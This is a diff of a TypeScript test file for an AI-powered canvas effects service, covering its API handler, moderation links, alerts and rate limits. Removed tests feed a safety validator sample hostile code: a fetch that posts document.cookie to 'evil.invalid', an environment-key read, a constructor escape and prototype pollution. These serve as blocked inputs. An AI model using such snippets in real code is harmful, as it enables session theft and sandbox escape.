@@ -1,326 +1,675 @@
-import { afterEach, describe, expect, it, vi } from "vitest";
+import process from "node:process";
+import { readFileSync } from "node:fs";
 
-import {
-  buildEffectModerationActionUrl,
-  clearApprovedEffectsCache,
-  EffectIdeaApiError,
-  compileRuntimeEffect,
-  fetchPendingEffect,
-  fetchPendingEffects,
-  fetchApprovedEffects,
-  generateEffectIdea,
-  improveEffectGenerationPromptTemplate,
-  submitEffectIdea,
-  validateGeneratedRuntimeCode
-} from "./effectIdeas";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
-describe("effect ideas client", () => {
+type MockRedis = {
+  get: (key: string) => Promise<unknown>;
+  set: (key: string, value: unknown) => Promise<unknown>;
+  lrange: (key: string, start: number, stop: number) => Promise<unknown[]>;
+  lpush: (key: string, value: unknown) => Promise<number>;
+  ltrim: (key: string, start: number, stop: number) => Promise<"OK">;
+};
+
+const createResponse = () => {
+  const headers = new Map<string, string>();
+  let body = "";
+  return {
+    response: {
+      statusCode: 0,
+      setHeader: (key: string, value: string) => headers.set(key, value),
+      end: (value = "") => {
+        body = value;
+      }
+    },
+    getBody: () => body
+  };
+};
+
+function createMockRedis(initialApproved: unknown[] = [], initialPending: unknown[] = []): MockRedis {
+  const approved = [...initialApproved];
+  let pending = [...initialPending];
+  const kv = new Map<string, unknown>();
+  return {
+    get: vi.fn(async (key: string) => {
+      if (key === "effects:pending") {
+        return pending;
+      }
+      return kv.has(key) ? kv.get(key) : null;
+    }),
+    set: vi.fn(async (key: string, value: unknown) => {
+      if (key === "effects:pending") {
+        pending = Array.isArray(value) ? [...value] : [];
+        return "OK";
+      }
+      kv.set(key, value);
+      return "OK";
+    }),
+    lrange: vi.fn(async (key: string) => (key === "effects:items" ? approved : [])),
+    lpush: vi.fn(async (key: string, value: unknown) => {
+      if (key === "effects:items") {
+        approved.unshift(value);
+      }
+      return approved.length;
+    }),
+    ltrim: vi.fn(async (_key: string, _start: number, stop: number) => {
+      approved.splice(stop + 1);
+      return "OK" as const;
+    })
+  };
+}
+
+describe("api/effects", () => {
+  const originalEnv = { ...process.env };
   const originalFetch = globalThis.fetch;
 
+  beforeEach(() => {
+    vi.resetModules();
+    process.env = { ...originalEnv };
+    process.env.EFFECT_GENERATE_ALLOWLIST_IPS = "127.0.0.1";
+    globalThis.fetch = vi.fn(
+      async () =>
+        new Response(
+          JSON.stringify({
+            output_text: JSON.stringify({
+              name: "Nebula",
+              typescriptCode: "ts",
+              runtimeCode: "return { render() {} };",
+              params: [{ key: "speed", label: "Speed", type: "number", defaultValue: 0.5, min: 0, max: 1 }],
+              docs: { description: "Generated effect", parameters: "- speed: movement speed." }
+            })
+          }),
+          { status: 200, headers: { "Content-Type": "application/json" } }
+        )
+    ) as typeof fetch;
+  });
+
   afterEach(() => {
+    process.env = { ...originalEnv };
     globalThis.fetch = originalFetch;
     vi.restoreAllMocks();
-    clearApprovedEffectsCache();
   });
 
-  it("generates effect code from the API", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({
-        generation: {
-          name: "Nebula Pulse",
-          typescriptCode: "export const name='Nebula Pulse';",
-          runtimeCode: "return { render() {} };",
-          params: [{ key: "speed", label: "Speed", type: "number", defaultValue: 1 }],
-          docs: { description: "Generated effect", parameters: "- speed: speed." }
+  it("lists approved effects", async () => {
+    const redis = createMockRedis([{ id: "a", name: "A", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 }]);
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({ method: "GET", url: "/api/effects" }, res.response);
+    expect(res.response.statusCode).toBe(200);
+    expect(JSON.parse(res.getBody()).effects).toHaveLength(1);
+  });
+
+  it("stores and returns shared effect param limits", async () => {
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+
+    const saveRes = createResponse();
+    await handler({
+      method: "POST",
+      url: "/api/effects?action=paramLimits",
+      body: JSON.stringify({
+        paramLimits: {
+          starfield: {
+            speed: { min: -3, max: 9 },
+            warp: { min: "bad", max: 4 }
+          }
         }
       })
-    })) as typeof fetch;
-
-    await expect(generateEffectIdea("nebula pulses")).resolves.toEqual({
-      name: "Nebula Pulse",
-      typescriptCode: "export const name='Nebula Pulse';",
-      runtimeCode: "return { render() {} };",
-      params: [{ key: "speed", label: "Speed", type: "number", defaultValue: 1 }],
-      docs: { description: "Generated effect", parameters: "- speed: speed." }
+    }, saveRes.response);
+    expect(saveRes.response.statusCode).toBe(200);
+    expect(JSON.parse(saveRes.getBody()).paramLimits).toEqual({
+      starfield: {
+        speed: { min: -3, max: 9 },
+        warp: { min: undefined, max: 4 }
+      }
     });
-    expect(globalThis.fetch).toHaveBeenCalledWith(
-      "/api/effects?action=generate",
-      expect.objectContaining({
-        method: "POST",
-        body: JSON.stringify({ prompt: "nebula pulses", improvementAttempt: 0 })
-      })
-    );
+
+    const readRes = createResponse();
+    await handler({ method: "GET", url: "/api/effects?action=paramLimits" }, readRes.response);
+    expect(readRes.response.statusCode).toBe(200);
+    expect(JSON.parse(readRes.getBody()).paramLimits).toEqual({
+      starfield: {
+        speed: { min: -3, max: 9 },
+        warp: { min: undefined, max: 4 }
+      }
+    });
   });
 
-  it("submits effect ideas for moderation", async () => {
-    globalThis.fetch = vi.fn(async () => ({ ok: true, status: 200, json: async () => ({ moderationStatus: "pending" }) })) as typeof fetch;
-
-    await expect(
-      submitEffectIdea({
-        name: "Tunnel",
-        prompt: "A tunnel",
+  it("stores submissions as pending", async () => {
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({
+      method: "POST",
+      url: "/api/effects",
+      body: JSON.stringify({
+        name: "A",
+        prompt: "p",
         typescriptCode: "ts",
-        runtimeCode: "return { render() {} };"
+        runtimeCode: "return { render() {} };",
+        params: [{ key: "speed", label: "Speed", type: "number", defaultValue: 1 }],
+        docs: { description: "Doc", parameters: "- speed: speed." }
       })
-    ).resolves.toBeUndefined();
+    }, res.response);
+    expect(res.response.statusCode).toBe(200);
+    expect(JSON.parse(res.getBody()).moderationStatus).toBe("pending");
+    expect(JSON.parse(res.getBody()).effect.params).toEqual([{ key: "speed", label: "Speed", type: "number", defaultValue: 1 }]);
   });
 
-  it("sends improvement attempt metadata for self-improvement retries", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({
-        generation: {
-          name: "Retry Nebula",
-          typescriptCode: "ts",
-          runtimeCode: "return { render() {} };"
-        }
-      })
-    })) as typeof fetch;
-
-    await generateEffectIdea("retry me", { improvementAttempt: 3 });
-    expect(globalThis.fetch).toHaveBeenCalledWith(
-      "/api/effects?action=generate",
-      expect.objectContaining({
-        body: JSON.stringify({ prompt: "retry me", improvementAttempt: 3 })
-      })
-    );
+  it("treats generated effect code as inert text on the server", () => {
+    const source = readFileSync(new URL("./effects.ts", import.meta.url), "utf8");
+    expect(source).not.toMatch(/\bnew Function\s*\(/u);
+    expect(source).not.toMatch(/\beval\s*\(/u);
+    expect(source).not.toMatch(/\bnode:vm\b|\bvm\./u);
   });
 
-  it("submits prompt-improvement payloads after failures", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({ promptTemplate: { version: 2 } })
-    })) as typeof fetch;
-
-    await improveEffectGenerationPromptTemplate({
-      userPrompt: "retro tunnel",
-      response: "not-json",
-      error: "Unable to parse generated effect response.",
-      improvementAttempt: 2,
-      failureHistory: [{ promptSent: "retro tunnel", response: "not-json", error: "Unable to parse generated effect response." }]
-    });
-
+  it("generates via OpenAI", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({
+      method: "POST",
+      url: "/api/effects?action=generate",
+      headers: { "x-forwarded-for": "127.0.0.1" },
+      body: JSON.stringify({ prompt: "make stars" })
+    }, res.response);
+    expect(res.response.statusCode).toBe(200);
+    const generated = JSON.parse(res.getBody()).generation;
+    expect(generated.name).toBe("Nebula");
+    expect(generated.attempts).toBeGreaterThanOrEqual(1);
+    expect(generated.params).toEqual([
+      { key: "speed", label: "Speed", type: "number", defaultValue: 0.5, min: 0, max: 1 }
+    ]);
     expect(globalThis.fetch).toHaveBeenCalledWith(
-      "/api/effects?action=improvePromptTemplate",
+      "https://api.openai.com/v1/responses",
       expect.objectContaining({
         method: "POST",
-        body: JSON.stringify({
-          userPrompt: "retro tunnel",
-          response: "not-json",
-          error: "Unable to parse generated effect response.",
-          improvementAttempt: 2,
-          failureHistory: [{ promptSent: "retro tunnel", response: "not-json", error: "Unable to parse generated effect response." }]
-        })
+        body: expect.stringContaining("Prefer deterministic helper functions, lookup tables, and explicit state updates")
       })
     );
   });
 
-  it("caches approved effects", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({ effects: [{ id: "1", name: "One", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 }] })
-    })) as typeof fetch;
+  it("returns an error when OpenAI key is missing for generation", async () => {
+    delete process.env.OPENAI_API_KEY;
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({
+      method: "POST",
+      url: "/api/effects?action=generate",
+      headers: { "x-forwarded-for": "127.0.0.1" },
+      body: JSON.stringify({ prompt: "make stars" })
+    }, res.response);
+    expect(res.response.statusCode).toBe(503);
+    expect(JSON.parse(res.getBody()).error).toContain("OPENAI_API_KEY");
+  });
 
-    await expect(fetchApprovedEffects()).resolves.toHaveLength(1);
-    await expect(fetchApprovedEffects()).resolves.toHaveLength(1);
+  it("returns raw model output when generation response cannot be parsed", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    globalThis.fetch = vi.fn(
+      async () =>
+        new Response(JSON.stringify({ output_text: "I can help with that! First, let's discuss..." }), {
+          status: 200,
+          headers: { "Content-Type": "application/json" }
+        })
+    ) as typeof fetch;
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({
+      method: "POST",
+      url: "/api/effects?action=generate",
+      headers: { "x-forwarded-for": "127.0.0.1" },
+      body: JSON.stringify({ prompt: "make stars" })
+    }, res.response);
+    expect(res.response.statusCode).toBe(503);
+    const payload = JSON.parse(res.getBody());
+    expect(payload.error).toContain("Unable to parse generated effect response.");
+    expect(payload.rawResponse).toContain("I can help with that");
+  });
+
+  it("self-improves the stored generation prompt template via dedicated improvement action", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    globalThis.fetch = (vi.fn()
+      .mockResolvedValueOnce({
+        ok: true,
+        status: 200,
+        json: async () => ({
+          output_text: JSON.stringify({
+            template: "You generate canvas demoscene effects. Return strict JSON with keys name, typescriptCode, runtimeCode, params, docs. Runtime code must be plain JS with render(context). Prefer deterministic helpers and avoid markdown."
+          })
+        })
+      })) as unknown as typeof fetch;
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+
+    const improve = createResponse();
+    await handler({
+      method: "POST",
+      url: "/api/effects?action=improvePromptTemplate",
+      headers: { "x-forwarded-for": "127.0.0.1" },
+      body: JSON.stringify({
+        userPrompt: "make stars",
+        response: "not-json",
+        error: "Unable to parse generated effect response.",
+        improvementAttempt: 1,
+        failureHistory: [{ promptSent: "make stars", response: "not-json", error: "Unable to parse generated effect response." }]
+      })
+    }, improve.response);
+    expect(improve.response.statusCode).toBe(200);
+
+    const metrics = createResponse();
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    await handler({ method: "GET", url: "/api/effects?action=generateMetrics&token=secret-token" }, metrics.response);
+    const payload = JSON.parse(metrics.getBody());
+    expect(payload.promptTemplate.version).toBe(2);
+    expect(payload.generateFailureLogs[0]).toEqual(expect.objectContaining({
+      improvementAttempt: 1,
+      userErrorMessage: "Unable to parse generated effect response."
+    }));
+  });
+
+  it("records generation failures in monitoring metrics and exposes them via authorized endpoint", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    delete process.env.OPENAI_API_KEY;
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+
+    const generate = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "make stars" })
+      },
+      generate.response
+    );
+    expect(generate.response.statusCode).toBe(503);
+
+    const metrics = createResponse();
+    await handler(
+      { method: "GET", url: "/api/effects?action=generateMetrics&token=secret-token" },
+      metrics.response
+    );
+    expect(metrics.response.statusCode).toBe(200);
+    const payload = JSON.parse(metrics.getBody());
+    expect(payload.generateMetrics).toEqual(
+      expect.objectContaining({
+        totalRequests: 1,
+        failedRequests: 1,
+        acceptedRequests: 0
+      })
+    );
+    expect(payload.generateMetrics.failureCategoryCounts.openai_config).toBe(1);
+    expect(payload.recentGenerateErrors).toHaveLength(1);
+    expect(payload.recentGenerateErrors[0]).toEqual(
+      expect.objectContaining({
+        httpStatus: 503,
+        category: "openai_config"
+      })
+    );
+  });
+
+  it("requires authorization for generate monitoring endpoint", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({ method: "GET", url: "/api/effects?action=generateMetrics" }, res.response);
+    expect(res.response.statusCode).toBe(401);
+    expect(JSON.parse(res.getBody()).error).toBe("Unauthorized.");
+  });
+
+  it("sends a generation failure alert and applies category cooldown", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    process.env.EFFECT_GENERATE_ALERT_NTFY_URL = "https://ntfy.sh/effect-generate-alerts";
+    process.env.EFFECT_GENERATE_ALERT_NTFY_TOKEN = "alert-token";
+    process.env.EFFECT_GENERATE_ALERT_COOLDOWN_MS = "600000";
+    delete process.env.OPENAI_API_KEY;
+    globalThis.fetch = vi.fn(
+      async () => new Response(JSON.stringify({}), { status: 200, headers: { "Content-Type": "application/json" } })
+    ) as typeof fetch;
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+
+    const first = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "make stars" })
+      },
+      first.response
+    );
+    expect(first.response.statusCode).toBe(503);
+    expect(globalThis.fetch).toHaveBeenCalledTimes(1);
+    expect(globalThis.fetch).toHaveBeenCalledWith(
+      "https://ntfy.sh/effect-generate-alerts",
+      expect.objectContaining({
+        method: "POST",
+        headers: expect.objectContaining({
+          Title: "Effect generate alert (openai_config)",
+          Priority: "high",
+          Authorization: "Bearer alert-token"
+        }),
+        body: expect.stringContaining("Category: openai_config")
+      })
+    );
+
+    const second = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "make stars again" })
+      },
+      second.response
+    );
+    expect(second.response.statusCode).toBe(503);
     expect(globalThis.fetch).toHaveBeenCalledTimes(1);
   });
 
-  it("fetches a pending effect for the review page", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({
-        effect: { id: "pending-2", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 3 },
-        reviewUrl: "/effect-review.html?id=pending-2&token=secret-token"
-      })
-    })) as typeof fetch;
+  it("sends ntfy moderation notifications for effect submissions", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    process.env.EFFECT_MODERATION_BASE_URL = "https://demo.example.com";
+    process.env.EFFECT_MODERATION_NTFY_URL = "https://ntfy.sh/effect-topic";
+    process.env.EFFECT_MODERATION_NTFY_TOKEN = "ntfy-token";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
 
-    await expect(fetchPendingEffect("pending-2", "secret-token")).resolves.toEqual({
-      effect: { id: "pending-2", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 3 },
-      reviewUrl: "/effect-review.html?id=pending-2&token=secret-token"
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects",
+        body: JSON.stringify({ name: "Tunnel", prompt: "Fast tunnel", typescriptCode: "ts", runtimeCode: "return { render() {} };" })
+      },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(200);
+    expect(globalThis.fetch).toHaveBeenCalledWith(
+      "https://ntfy.sh/effect-topic",
+      expect.objectContaining({
+        method: "POST",
+        headers: expect.objectContaining({
+          "Title": "Effect idea awaiting approval",
+          "Click": expect.stringContaining("/effect-review.html?id=")
+        }),
+        body: expect.stringContaining("Review: https://demo.example.com/effect-review.html?id=")
+      })
+    );
+  });
+
+  it("returns a single pending effect for the review page", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    process.env.EFFECT_MODERATION_BASE_URL = "https://demo.example.com";
+    const redis = createMockRedis([], [{ id: "pending-1", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 }]);
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      { method: "GET", url: "/api/effects?pendingId=pending-1&token=secret-token" },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(200);
+    expect(JSON.parse(res.getBody())).toEqual({
+      effect: { id: "pending-1", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 },
+      reviewUrl: "https://demo.example.com/effect-review.html?id=pending-1&token=secret-token"
     });
-    expect(globalThis.fetch).toHaveBeenCalledWith(
-      "/api/effects?pendingId=pending-2&token=secret-token",
-      expect.objectContaining({ method: "GET" })
-    );
   });
 
-  it("accepts pending effects even when optional metadata is malformed", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({
-        effect: {
-          id: "pending-legacy",
-          name: "Legacy",
-          prompt: "Legacy prompt",
-          typescriptCode: "ts",
-          runtimeCode: "return { render() {} };",
-          params: "bad-shape",
-          docs: null,
-          createdAt: 5
-        }
-      })
-    })) as typeof fetch;
-
-    const result = await fetchPendingEffect("pending-legacy", "secret-token");
-    expect(result.reviewUrl).toBeNull();
-    expect(result.effect).not.toBeNull();
-    expect(result.effect?.id).toBe("pending-legacy");
-  });
-
-  it("fetches pending effects queue for next-item moderation", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: true,
-      status: 200,
-      json: async () => ({
-        effects: [],
-        pendingEffects: [
-          { id: "pending-1", name: "One", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 },
-          { id: "pending-2", name: "Two", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 2 }
-        ]
-      })
-    })) as typeof fetch;
-
-    await expect(fetchPendingEffects("secret-token")).resolves.toEqual([
-      { id: "pending-1", name: "One", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 },
-      { id: "pending-2", name: "Two", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 2 }
+  it("keeps pending review fetch working when optional metadata shape drifts", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    process.env.EFFECT_MODERATION_BASE_URL = "https://demo.example.com";
+    const redis = createMockRedis([], [
+      {
+        id: "pending-legacy",
+        name: "Legacy",
+        prompt: "Older payload format",
+        code: "return { render() {} };",
+        params: "bad-shape",
+        docs: null,
+        createdAt: 7
+      }
     ]);
-    expect(globalThis.fetch).toHaveBeenCalledWith(
-      "/api/effects?includePending=1&token=secret-token",
-      expect.objectContaining({ method: "GET" })
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      { method: "GET", url: "/api/effects?pendingId=pending-legacy&token=secret-token" },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(200);
+    expect(JSON.parse(res.getBody())).toEqual({
+      effect: {
+        id: "pending-legacy",
+        name: "Legacy",
+        prompt: "Older payload format",
+        typescriptCode: "return { render() {} };",
+        runtimeCode: "return { render() {} };",
+        createdAt: 7
+      },
+      reviewUrl: "https://demo.example.com/effect-review.html?id=pending-legacy&token=secret-token"
+    });
+  });
+
+  it("approves a pending effect through a signed one-tap link with HTML response", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    const redis = createMockRedis([], [{ id: "pending-1", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 }]);
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      { method: "GET", url: "/api/effects?action=approve&id=pending-1&token=secret-token" },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(200);
+    expect(res.getBody()).toContain("Effect approved");
+    expect(redis.lpush).toHaveBeenCalledWith(
+      "effects:items",
+      expect.objectContaining({ id: "pending-1" })
     );
   });
 
-  it("builds moderation action URLs for effect review buttons", () => {
-    expect(buildEffectModerationActionUrl("approve", "pending-3", "secret token")).toBe(
-      "/api/effects?action=approve&id=pending-3&token=secret+token"
+  it("approves legacy pending effects through signed links", async () => {
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    const redis = createMockRedis([], [{ id: "pending-legacy", name: "Legacy", code: "return { render() {} };", createdAt: 1 }]);
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      { method: "GET", url: "/api/effects?action=approve&id=pending-legacy&token=secret-token" },
+      res.response
     );
-    expect(buildEffectModerationActionUrl("reject", "pending-3", "secret token")).toBe(
-      "/api/effects?action=reject&id=pending-3&token=secret+token"
-    );
-  });
 
-  it("compiles runtime effects", () => {
-    const effect = compileRuntimeEffect("return { render() { return; } };");
-    expect(typeof effect.render).toBe("function");
-  });
-
-  it("compiles module-style generated code with export default factory", () => {
-    const effect = compileRuntimeEffect(`
-      type Demo = { render: (context: CanvasRenderingContext2D) => void; reset?: () => void; };
-      export default function createDemo(): Demo {
-        return {
-          render(context: CanvasRenderingContext2D) {
-            context.fillRect(0, 0, context.canvas.width, context.canvas.height);
-          },
-          reset() {}
-        };
-      }
-    `);
-    expect(typeof effect.render).toBe("function");
-    expect(typeof effect.reset).toBe("function");
-  });
-
-  it("compiles runtime code delivered with escaped newlines", () => {
-    const effect = compileRuntimeEffect("return {\\n  render(context) {\\n    context.ctx.fillRect(0, 0, context.width, context.height);\\n  },\\n  reset() {}\\n};");
-    expect(typeof effect.render).toBe("function");
-    expect(typeof effect.reset).toBe("function");
-  });
-
-  it("rejects runtime code that attempts data exfiltration", () => {
-    expect(() => validateGeneratedRuntimeCode("return { render() { fetch('https://evil.invalid/leak', { method: 'POST', body: document.cookie }); } };"))
-      .toThrow("Generated runtime code blocked by safety policy");
-  });
-
-  it("rejects runtime code that reads process environment variables", () => {
-    expect(() => compileRuntimeEffect("return { render() { console.log(process.env.OPENAI_API_KEY); } };"))
-      .toThrow("Generated runtime code blocked by safety policy");
-  });
-
-  it("allows comments and strings that mention blocked primitives", () => {
-    expect(() => compileRuntimeEffect(`
-      // Avoid eval() and new Function() in this effect.
-      return {
-        render() {
-          const note = "Never call import('x') from generated effects.";
-          void note;
-        }
-      };
-    `)).not.toThrow();
-  });
-
-  it("rejects dynamic code execution helpers", () => {
-    expect(() => validateGeneratedRuntimeCode(`
-      const factory = new Function("return 6 * 7;");
-      const imported = import("./optional-effect-helper.js");
-      const maybeRequired = require("./optional-effect-helper");
-      const value = eval("factory()");
-      void imported;
-      void maybeRequired;
-      void value;
-    `)).toThrow("dynamic_code_exec");
-  it("rejects obfuscated constructor escapes", () => {
-    expect(() => validateGeneratedRuntimeCode(`
-      const ctor = globalThis["con" + "structor"];
-      return ctor("return 42")();
-    `)).toThrow("Generated runtime code blocked by safety policy");
-  });
-
-  it("rejects computed-property prototype poisoning attempts", () => {
-    expect(() => validateGeneratedRuntimeCode(`
-      const target = {};
-      target["__proto__"] = { polluted: true };
-    `)).toThrow("Generated runtime code blocked by safety policy");
-  });
-
-  it("rejects infinite loops", () => {
-    expect(() => validateGeneratedRuntimeCode(`
-      while (true) {
-        break;
-      }
-    `)).toThrow("Generated runtime code blocked by safety policy");
-  });
-
-
-  it("kills effects after repeated budget violations", () => {
-    const effect = compileRuntimeEffect("return { render(ctx) { for (let i = 0; i < 5_000_000; i += 1) { Math.sqrt(i); } } };");
-    expect(() => {
-      effect.render({ width: 1000, height: 1000 } as never);
-      effect.render({ width: 1000, height: 1000 } as never);
-      effect.render({ width: 1000, height: 1000 } as never);
-    }).toThrow("sandbox kill switch");
-  });
-
-  it("surfaces API error messages for generation failures", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: false,
-      status: 503,
-      json: async () => ({ error: "OPENAI_API_KEY is not configured." })
-    })) as typeof fetch;
-
-    await expect(generateEffectIdea("test")).rejects.toThrow("OPENAI_API_KEY is not configured.");
-  });
-
-  it("preserves raw model responses on API failures", async () => {
-    globalThis.fetch = vi.fn(async () => ({
-      ok: false,
-      status: 503,
-      json: async () => ({
-        error: "Unable to parse generated effect response.",
-        rawResponse: "Sure! Here is a markdown explanation first..."
+    expect(res.response.statusCode).toBe(200);
+    expect(redis.lpush).toHaveBeenCalledWith(
+      "effects:items",
+      expect.objectContaining({
+        id: "pending-legacy",
+        typescriptCode: "return { render() {} };",
+        runtimeCode: "return { render() {} };"
       })
-    })) as typeof fetch;
+    );
+  });
 
-    await expect(generateEffectIdea("test")).rejects.toMatchObject({
-      name: "EffectIdeaApiError",
-      rawResponse: "Sure! Here is a markdown explanation first..."
-    } satisfies Partial<EffectIdeaApiError>);
+  it("allows generate for public users without auth gating", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    process.env.EFFECT_GENERATE_ALLOWLIST_IPS = "";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "make stars" })
+      },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(200);
+    const generated = JSON.parse(res.getBody()).generation;
+    expect(generated.name).toBe("Nebula");
+    expect(generated.attempts).toBeGreaterThanOrEqual(1);
+  });
+
+  it("allows generate via moderation bearer token", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    process.env.EFFECT_MODERATION_TOKEN = "secret-token";
+    process.env.EFFECT_GENERATE_ALLOWLIST_IPS = "";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { authorization: "Bearer secret-token" },
+        body: JSON.stringify({ prompt: "make stars" })
+      },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(200);
+    const generated = JSON.parse(res.getBody()).generation;
+    expect(generated.name).toBe("Nebula");
+    expect(generated.attempts).toBeGreaterThanOrEqual(1);
+  });
+
+  it("rate limits generate requests by identity", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    process.env.EFFECT_GENERATE_RATE_LIMIT_MAX = "1";
+    process.env.EFFECT_GENERATE_RATE_LIMIT_WINDOW_MS = "300000";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+
+    const first = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "make stars" })
+      },
+      first.response
+    );
+    expect(first.response.statusCode).toBe(200);
+
+    const second = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "make stars again" })
+      },
+      second.response
+    );
